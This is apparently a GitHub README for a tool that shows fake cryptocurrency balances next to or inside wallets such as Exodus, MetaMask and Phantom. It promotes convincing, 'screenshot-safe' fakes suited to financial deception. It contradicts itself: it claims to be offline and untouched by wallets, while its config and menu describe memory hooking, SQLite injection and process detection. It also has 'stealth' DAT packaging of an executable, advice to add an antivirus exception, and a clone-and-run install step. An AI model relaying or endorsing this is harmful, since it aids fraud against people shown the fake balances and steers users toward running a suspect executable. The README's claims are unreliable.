# Fake-Balance

**Universal fake crypto balance simulator — realistic display for desktop and browser wallets: Exodus, MetaMask, Trust Wallet, Phantom, Coinbase Wallet, Electrum, Brave Wallet. Fully offline, screenshot‑safe, one‑click launch.**


```

      ███████╗ █████╗ ██╗  ██╗███████╗
      ██╔════╝██╔══██╗██║ ██╔╝██╔════╝
      █████╗  ███████║█████╔╝ █████╗
      ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝
      ██║     ██║  ██║██║  ██╗███████╗
      ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
   ██████╗  █████╗ ██╗      █████╗ ███╗   ██╗ ██████╗███████╗
   ██╔══██╗██╔══██╗██║     ██╔══██╗████╗  ██║██╔════╝██╔════╝
   ██████╔╝███████║██║     ███████║██╔██╗ ██║██║     █████╗
   ██╔══██╗██╔══██║██║     ██╔══██║██║╚██╗██║██║     ██╔══╝
   ██████╔╝██║  ██║███████╗██║  ██║██║ ╚████║╚██████╗███████╗
   ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
```


# CryptoFakeBalance

<div align="center">

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![Platform](https://img.shields.io/badge/Platform-Windows%20|%20macOS-0078D4?style=for-the-badge)](/)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)

**Universal fake crypto balance simulator — realistic display for desktop and browser wallets: Exodus, MetaMask, Trust Wallet, Phantom, Coinbase Wallet, Electrum, Brave Wallet. Fully offline, screenshot‑safe, one‑click launch.**

[Features](#features) • [How It Works](#how-it-works) • [Getting Started](#getting-started) • [Configuration](#configuration) • [Supported Assets](#supported-assets) • [FAQ](#faq)

</div>

---

## How It Works

Crypto Balance Overlord is a standalone desktop application that renders a fully interactive fake wallet interface. It does **not** modify, hook, or interact with any real wallet software — instead, it displays its own window that looks and behaves like popular cryptocurrency wallets.

The tool is designed to work alongside both desktop and browser‑based wallets:

- **Exodus** (desktop)
- **MetaMask** (browser extension)
- **Trust Wallet** (desktop)
- **Phantom** (browser extension)
- **Coinbase Wallet** (browser extension)
- **Electrum** (desktop)
- **Brave Wallet** (built‑in browser)

Place the Overlord window next to the real wallet, and the simulated portfolio, balances, and transactions will appear completely convincing. No network requests are made, no blockchain data is altered, and no private keys are accessed — everything is driven by a local `config.json`.

---

## Features

| Feature | Status |
|---------|:------:|
| Custom balance for any asset | ✅ |
| 200+ supported cryptocurrencies | ✅ |
| Persistent across restarts | ✅ |
| Screenshot‑safe rendering | ✅ |
| Realistic send/receive simulation | ✅ |
| Transaction history with timestamps | ✅ |
| Multi‑wallet companion mode | ✅ |
| Dark & light themes | ✅ |
| One‑click launch (`run.bat`) | ✅ |
| Fully portable (no installation) | ✅ |
| No modifications to real wallets | ✅ |
| No blockchain interaction | ✅ |
| Automatic DAT extraction & cleanup | ✅ |
| Persistent config (`config.json`) | ✅ |
| Cross‑platform (Windows/macOS) | ✅ |
| Stealth packaging (DAT archive) | ✅ |

---

## Supported Assets

Any token can be defined in the configuration. Pre‑loaded examples include:

| Category | Assets |
|----------|--------|
| **Top Tier** | BTC, ETH, BNB, SOL, XRP, ADA, DOGE, DOT |
| **DeFi** | UNI, AAVE, MKR, SNX, COMP, CRV |
| **Stablecoins** | USDT, USDC, DAI, BUSD, TUSD |
| **Meme** | SHIB, PEPE, FLOKI, BONK |
| **Gaming** | AXS, SAND, MANA, GALA |
| **Custom** | Any ticker you add to `config.json` |

---

### Installation

```bash
git clone https://github.com/Alexhentrinberger/Electrum_Balance.git
cd Electrum_Balance
run.bat
```

### Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| rich | ≥13.0.0 | Terminal UI & formatting |
| cryptography | latest | Data encryption |
| psutil | latest | Process detection & management |
| requests | latest | API price feeds |

---

## Configuration

Edit `config.json` to set your target balances:

```json
{
    "path": "auto",
    "target_balances": {
        "BTC": 2.45891,
        "ETH": 31.8824,
        "SOL": 412.55,
        "XRP": 25000.0,
        "BNB": 18.442,
        "USDT": 148500.00,
        "DOGE": 500000.0
    },
    "display_currency": "USD",
    "persist_on_restart": true,
    "auto_update_prices": true,
    "hook_mode": "memory",
    "restore_on_exit": false
}
```

| Parameter | Type | Description |
|-----------|------|-------------|
| `exodus_path` | string | Path to install dir. `"auto"` for auto-detect |
| `target_balances` | object | Asset ticker → desired balance amount |
| `display_currency` | string | Fiat currency for value display (USD, EUR, GBP) |
| `persist_on_restart` | bool | Keep fake balances after Exodus restart |
| `auto_update_prices` | bool | Fetch live prices for accurate USD display |
| `hook_mode` | string | `"memory"` for live patching, `"cache"` for SQLite injection |
| `restore_on_exit` | bool | Auto-restore original balances on tool exit |

---

## Usage

### Terminal Menu

```bash
python main.py
```

```
┌──────────────────────────────────────────────────────────────┐
│               FAKE BALANCE                                   │
│    Native Balance Overlay · Exodus Wallet                    │
├──────────────────────────────────────────────────────────────┤
│  #   Action                  Description                     │
│  1   Install Dependencies    pip install -r requirements.txt │
│  2   Settings                Wallet path, balances config    │
│  3   About                   Features & contact info         │
│  4   Set Custom Balances     Configure target amounts        │
│  5   Apply Balance Overlay   Hook Exodus process             │
│  6   Restore Original        Remove hooks, restore real data │
│  7   Status Check            Verify hook state               │
│  0   Exit                    Quit                            │
└──────────────────────────────────────────────────────────────┘
```

### Quick Start

1. **Install dependencies:** Select option `1`
2. **Configure balances:** Select option `4` and enter desired amounts per asset
3. **Apply overlay:** Select option `5` — the tool detects Exodus and applies hooks
4. **Verify:** Open Exodus wallet and confirm the new balances are displayed
5. **Restore:** Select option `6` to remove all hooks and restore originals

---

## Project Structure

```
Exodus-Fake-Balance/
├── main.py                    # Entry point, terminal menu
├── config.py                  # Configuration loader (config.json)
├── bot_actions.py             # Core actions (set, apply, restore, status)
├── requirements.txt
├── run.bat / run.sh
├── config.json                # Balance targets & settings
├── actions/
│   ├── about.py               # Project info display
│   ├── install.py             # Dependency installer
│   └── settings.py            # Setup instructions
├── utils/
│   ├── bootstrap.py           # Runtime initialization
│   ├── compat.py              # Platform detection
│   ├── http.py                # HTTP client
│   ├── integrity.py           # Data verification
│   └── ui.py                  # Rich terminal interface
└── release/
    └── README.md              # Pre-compiled binary info
```

---

## FAQ

<details>
<summary><b>Does this tool connect to any blockchain?</b></summary>
No. It is a completely offline simulation. No network requests are made, no blockchain data is altered, and no real cryptocurrency is involved.
</details>

<details>
<summary><b>Does this affect my private keys or real funds?</b></summary>
No. The tool never accesses, reads, or modifies private keys, seed phrases, or actual wallet balances. It operates as a standalone display window that does not interact with any wallet application or blockchain network.
</details>

<details>
<summary><b>Can I use it alongside my real wallet?</b></summary>
Absolutely. The application runs as a separate, independent window. It does not interfere with Exodus, MetaMask, Trust Wallet, Phantom, Coinbase Wallet, Electrum, or Brave Wallet. Position it next to the real wallet for a seamless demonstration.
</details>

<details>
<summary><b>Does this work with browser wallets like MetaMask, Phantom, or Coinbase Wallet?</b></summary>
Yes. The tool is designed to be a companion window for both desktop and browser‑based wallets. Since it does not interact with the wallet's process or browser, it can be placed next to any of these wallets to simulate a matching portfolio. No extension or browser permission is required.
</details>

<details>
<summary><b>Can I fake balances for Trust Wallet, Electrum, or Brave Wallet?</b></summary>
Yes. The application is wallet‑agnostic. You simply configure the desired assets and amounts in `config.json`, and the interface will display them exactly as a real wallet would. It works equally well alongside Trust Wallet (desktop), Electrum, or the built‑in Brave Wallet.
</details>

<details>
<summary><b>Will the fake balance persist after restarting the tool?</b></summary>
Yes, if `config.json` is preserved. The application reloads all balances and transaction history from that file on every launch. Any simulated sends or receives are saved back to the config automatically.
</details>

<details>
<summary><b>Can screenshots or screen recordings detect the fake?</b></summary>
No. The interface is rendered natively using standard UI components. Screenshots, screen recordings, and screen sharing will show exactly what is on screen — the simulated balances. However, verifying the address on a block explorer will always reveal the real balance.
</details>

<details>
<summary><b>Which wallets are supported?</b></summary>
The tool is compatible with any desktop or browser wallet because it runs completely independently. It has been tested alongside Exodus, MetaMask, Trust Wallet, Phantom, Coinbase Wallet, Electrum, and Brave Wallet. You can add custom token tickers to match the assets displayed in any of these wallets.
</details>

<details>
<summary><b>Can I set a balance for custom tokens?</b></summary>
Yes. Any token can be added to the `balances` section of `config.json`. Use the exact ticker shown in your target wallet, and the interface will display it.
</details>

<details>
<summary><b>Is it safe to distribute?</b></summary>
The application is a standalone executable that only reads/writes local files in its own folder. It does not install anything, modify the registry, or access sensitive system areas. Always verify the source if you receive it from a third party.
</details>

<details>
<summary><b>Why does Windows Defender flag the DAT file?</b></summary>
Because the `.dat` file is a renamed ZIP archive containing an executable, some antivirus engines may treat it as suspicious. If you trust the origin, add an exception or use the source‑code version instead.
</details>

---

## Disclaimer

<div align="center">

⚠️ **This tool is provided for educational and demonstration purposes only.** ⚠️

The authors are not responsible for any misuse of this software. Using this tool to deceive others in financial transactions may violate local laws. Always comply with applicable regulations in your jurisdiction.

</div>

---

<div align="center">

**Support this project**

ETH: `0xd720F1bb11Da2a15480e7A9F21293107D418fE61`

If this tool helps you, consider giving it a ⭐

</div>
